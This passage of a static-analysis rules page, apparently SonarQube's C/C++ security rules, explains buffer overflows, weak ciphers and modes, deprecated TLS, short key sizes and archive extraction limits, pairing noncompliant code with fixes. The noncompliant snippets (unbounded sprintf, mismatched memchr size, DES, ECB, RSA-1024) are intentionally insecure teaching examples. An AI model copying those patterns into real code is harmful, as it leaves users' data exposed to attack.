int f(const char *filename, int flags) {
  const int max_number_of_extraced_entries &#61; 1000;
  const int64_t max_file_size &#61; 1000000000; // 1 GB

  int number_of_extraced_entries &#61; 0;
  int64_t total_file_size &#61; 0;

  struct archive_entry *entry;
  struct archive *a &#61; archive_read_new();
  struct archive *ext &#61; archive_write_disk_new();
  archive_write_disk_set_options(ext, flags);
  archive_read_support_format_tar(a);
  int status &#61; 0;

  if ((archive_read_open_filename(a, filename, 10240))) {
    return -1;
  }

  for (;;) {
    number_of_extraced_entries&#43;&#43;;
    if (number_of_extraced_entries &gt; max_number_of_extraced_entries) {
      status &#61; 1;
      break;
    }

    int r &#61; archive_read_next_header(a, &amp;entry);
    if (r &#61;&#61; ARCHIVE_EOF) {
      break;
    }
    if (r !&#61; ARCHIVE_OK) {
      status &#61; -1;
      break;
    }

    int file_size &#61; archive_entry_size(entry);
    total_file_size &#43;&#61; file_size;
    if (total_file_size &gt; max_file_size) {
      status &#61; 1;
      break;
    }
  }
  archive_read_close(a);
  archive_read_free(a);

  archive_write_close(ext);
  archive_write_free(ext);

  return status;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/409" rel="nofollow">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.&#43;Safely&#43;extract&#43;files&#43;from&#43;ZipInputStream" rel="nofollow">CERT, IDS04-J.</a> - Safely
  extract files from ZipInputStream </li><li> <a href="https://www.bamsoftware.com/hacks/zipbomb/" rel="nofollow">bamsoftware.com</a> - A better Zip Bomb </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S6069">
              c:S6069
            </a>
          </td>
          <td>
            <details>
              <p>When using <code>sprintf</code> , it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid buffer
overflows. Buffer overflows can cause the program to crash at a minimum. At worst, a carefully crafted overflow can cause malicious code to be
executed.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> if the provided buffer is large enough for the result of any possible call to the <code>sprintf</code> function (including all possible format
  strings and all possible additional arguments). </li></ul>
<p>There is a risk if you answered no to the above question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>There are fundamentally safer alternatives. <code>snprintf</code> is one of them. It takes the size of the buffer as an additional argument,
preventing the function from overflowing the buffer.</p>
<ul><li> Use <code>snprintf</code> instead of <code>sprintf</code>. The slight performance overhead can be afforded in a vast majority of projects.
  </li><li> Check the buffer size passed to <code>snprintf</code>. </li></ul>
<p>If you are working in C&#43;&#43;, other safe alternative exist:</p>
<ul><li> <code>std::string</code> should be the prefered type to store strings </li><li> You can format to a string using <code>std::ostringstream</code> </li><li> Since C&#43;&#43;20, <code>std::format</code> is also available to format strings </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
sprintf(str, &#34;%s&#34;, message);   // Sensitive: &#96;str&#96; buffer size is not checked and it is vulnerable to overflows
</pre>
<h2>Compliant Solution</h2>
<pre>
snprintf(str, sizeof(str), &#34;%s&#34;, message); // Prevent overflows by enforcing a maximum size for &#96;str&#96; buffer
</pre>
<h2>Exceptions</h2>
<p>It is a very common and acceptable pattern to compute the required size of the buffer with a call to <code>snprintf</code> with the same arguments
into an empty buffer (this will fail, but return the necessary size), then to call <code>sprintf</code> as the bound check is not needed anymore. Note
that 1 needs to be added by the size reported by <code>snprintf</code> to account for the terminal null character.</p>
<pre>
size_t buflen &#61; snprintf(0, 0, &#34;%s&#34;, message);
char* buf &#61; malloc(buflen &#43; 1); // For the final 0
sprintf(buf, &#34;%s&#34;, message);{code}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category
  A9</a> - Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/676" rel="nofollow">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li><li> <a href="https://cwe.mitre.org/data/definitions/119" rel="nofollow">MITRE, CWE-119</a> - Improper Restriction of Operations within the Bounds of a Memory
  Buffer </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5547">
              c:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection. </li><li> Security during transmission or on storage devices. </li><li> Data integrity, general trust, and authentication. </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create(&#34;DES/CBC/PKCS7&#34;, Botan::ENCRYPTION); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create(&#34;AES-256/GCM&#34;, Botan::ENCRYPTION);
}
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://botan.randombit.net/handbook/" rel="nofollow">Botan</a> - Handbook </li><li> <a href="https://www.feistyduck.com/books/openssl-cookbook/" rel="nofollow">OpenSSL</a> - Cookbook </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5542">
              c:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>
<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>
<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create(&#34;AES-256/ECB&#34;, Botan::ENCRYPTION); // Noncompliant
}
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;botan/rng.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/rsa.h&gt;
#include &lt;botan/pubkey.h&gt;

void encrypt() {
  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);
  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);

  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), &#34;PKCS1v15&#34;); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create(&#34;AES-256/GCM&#34;, Botan::ENCRYPTION);
}
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
#include &lt;botan/rng.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/rsa.h&gt;
#include &lt;botan/pubkey.h&gt;

void encrypt() {
  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);
  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);

  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), &#34;OAEP&#34;);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: Use Galois/Counter mode (GCM)</h4>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul><li> CCM: <code>Counter with CBC-MAC</code> </li><li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li><li> EAX: <code>Encrypt-and-Authenticate</code> </li><li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li><li> OCB: <code>Offset Codebook Mode</code> </li></ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>
<p>is considered more straightforward to use AES-GCM directly instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5782">
              c:S5782
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Array overruns and buffer overflows happen when memory access accidentally goes beyond the boundary of the allocated array or buffer. These
overreaching accesses cause some of the most damaging, and hard to track defects.</p>
<p>When the buffer overflow happens while reading a buffer, it can expose sensitive data that happens to be located next to the buffer in memory. When
it happens while writing a buffer, it can be used to inject code or to wipe out sensitive memory.</p>
<p>This rule detects when a POSIX function takes one argument that is a buffer and another one that represents the size of the buffer, but the two
arguments do not match.</p>
<h3>Noncompliant code example</h3>
<pre>
char array[10];
initialize(array);
void *pos &#61; memchr(array, &#39;&#64;&#39;, 42); // Noncompliant, buffer overflow that could expose sensitive data
</pre>
<h3>Compliant solution</h3>
<pre>
char array[10];
initialize(array);
void *pos &#61; memchr(array, &#39;&#64;&#39;, 10);
</pre>
<h3>Exceptions</h3>
<p>Functions related to sockets using the type <code>socklen_t</code> are not checked. This is because these functions are using a C-style polymorphic
pattern using <code>union</code>. It relies on a mismatch between allocated memory and sizes of structures and it creates false positives.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/119" rel="nofollow">MITRE, CWE-119</a> - Improper Restriction of Operations within the Bounds of a Memory
  Buffer </li><li> <a href="https://cwe.mitre.org/data/definitions/131" rel="nofollow">MITRE, CWE-131</a> - Incorrect Calculation of Buffer Size </li><li> <a href="https://cwe.mitre.org/data/definitions/788" rel="nofollow">MITRE, CWE-788</a> - Access of Memory Location After End of Buffer </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/wtYxBQ" rel="nofollow">CERT, ARR30-C.</a> - Do not form or use out-of-bounds pointers or array subscripts </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/i3w-BQ" rel="nofollow">CERT, STR50-CPP.</a> - Guarantee that storage for strings has sufficient space for
  character data and the null terminator </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S4423">
              c:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in cURL</h2>
<h3>Code examples</h3>
<p>The following code samples attempt to create an HTTP request.</p>
<h4>Noncompliant code example</h4>
<p>This sample uses Curl’s default TLS algorithms, which are weak cryptographical algorithms: TLSv1.0 and LTSv1.1.</p>
<pre data-diff-id="11" data-diff-type="noncompliant">
#include &lt;curl/curl.h&gt;

void encrypt() {
    CURL *curl;
    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl &#61; curl_easy_init();                                      // Noncompliant
    curl_easy_setopt(curl, CURLOPT_URL, &#34;https://example.com/&#34;);

    curl_easy_perform(curl);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
#include &lt;curl/curl.h&gt;

void encrypt() {
    CURL *curl;
    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl &#61; curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, &#34;https://example.com/&#34;);
    curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);

    curl_easy_perform(curl);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S4426">
              c:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul><li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li><li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul><li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li></ul>  </li></ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br /> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/pubkey.h&gt;
#include &lt;botan/rng.h&gt;
#include &lt;botan/rsa.h&gt;

void encrypt() {
    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);
    Botan::RSA_PrivateKey                           rsaKey(*rng, 1024); // Noncompliant
}
</pre>
<p>Here is an example with the generation of a key as part of a Discrete Logarithmic (DL) group, a Digital Signature Algorithm (DSA) parameter:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;botan/dl_group.h&gt;

void encrypt() {
    Botan::DL_Group(&#34;dsa/botan/1024&#34;); // Noncompliant
}
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
#include &lt;botan/ec_group.h&gt;

void encrypt() {
    Botan::EC_Group(&#34;secp160k1&#34;); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/pubkey.h&gt;
#include &lt;botan/rng.h&gt;
#include &lt;botan/rsa.h&gt;

void encrypt() {
    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);
    Botan::RSA_PrivateKey                           rsaKey(*rng, 2048);
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
#include &lt;botan/dl_group.h&gt;

void encrypt() {
    Botan::DL_Group(&#34;dsa/botan/2048&#34;);
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
#include &lt;botan/ec_group.h&gt;

void encrypt() {
    Botan::EC_Group(&#34;secp224k1&#34;);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br /> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms are mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC algorithms.</p>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br /> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
&#34;post-quantum&#34;) counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation" rel="nofollow">Learn more here</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
